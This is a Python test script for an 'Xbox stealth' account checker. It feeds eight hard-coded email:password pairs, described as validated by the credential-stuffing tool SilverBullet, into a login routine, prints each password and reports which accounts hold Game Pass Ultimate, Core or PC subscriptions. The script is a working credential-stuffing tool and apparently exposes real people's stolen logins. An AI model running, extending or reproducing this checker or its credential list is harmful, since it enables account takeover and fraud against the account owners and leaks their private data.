#!/usr/bin/env python3
"""
Test script for Xbox authentication with enhanced token extraction
"""
import sys
import os
sys.path.append(os.path.dirname(os.path.abspath(__file__)))

from xbox_stealth import StealthAPI
import logging

# Set up logging
logging.basicConfig(level=logging.DEBUG, format='%(asctime)s [%(levelname)s] %(message)s')

def test_auth():
    """Test authentication with the provided credentials from SilverBullet"""
    api = StealthAPI()
    
    # Test credentials provided by user (validated by SilverBullet)
    test_accounts = [
        "paulosuniga@hotmail.com:P14c1499",
        "iconarut.vlad@gmail.com:Rolemodel33!",
        "mourar_1@yahoo.com.br:Octopus!1",
        "mrch19762304@gmail.com:Esmeralda777?",
        "msstorepla4@outlook.com:1M$stores!",
        "richardz66@outlook.com:ziegler66!",
        "javimaster01@hotmail.com:Jrcs2025",
        "veronicadasilvacarneiro@hotmail.com:Carneiro13***"
    ]
    
    print("🎮 Testing Xbox Authentication with SilverBullet Validated Accounts...")
    print("=" * 70)
    print(f"Testing {len(test_accounts)} accounts that SilverBullet marked as valid")
    print("=" * 70)
    
    for i, account in enumerate(test_accounts[:3], 1):  # Test first 3 accounts
        try:
            if ':' not in account:
                print(f"❌ Invalid format for account {i}: {account}")
                continue
                
            email, password = account.split(':', 1)
            print(f"\n🔍 Test {i}: {email}")
            print(f"🔑 Password: {password}")
            print("-" * 50)
            
            # Test the authentication
            result = api.authenticate_account(email, password)
            
            print(f"📊 Status: {result['status']}")
            print(f"💬 Message: {result.get('message', 'N/A')}")
            if 'subscription' in result:
                print(f"🎮 Subscription: {result['subscription']}")
            
            # Check what type of result we got
            if result['status'] == 'ultimate':
                print("🎉 XBOX GAME PASS ULTIMATE FOUND!")
            elif result['status'] == 'core':
                print("🔵 XBOX GAME PASS CORE FOUND!")
            elif result['status'] == 'pc_console':
                print("🟡 XBOX GAME PASS PC/CONSOLE FOUND!")
            elif result['status'] == 'free':
                print("⚪ Valid account, no Game Pass subscription")
            elif result['status'] == 'invalid':
                print("❌ Invalid credentials")
            else:
                print("⚠️ Authentication error or unknown status")
            
            print("-" * 50)
            
        except Exception as e:
            print(f"❌ Error testing {account}: {e}")
    
    print("\n✅ Test completed!")
    print("If you see 'PPFT token' errors, it means Microsoft has changed their login flow.")
    print("The multi-API fallback system should handle this automatically.")

if __name__ == "__main__":
    test_auth()
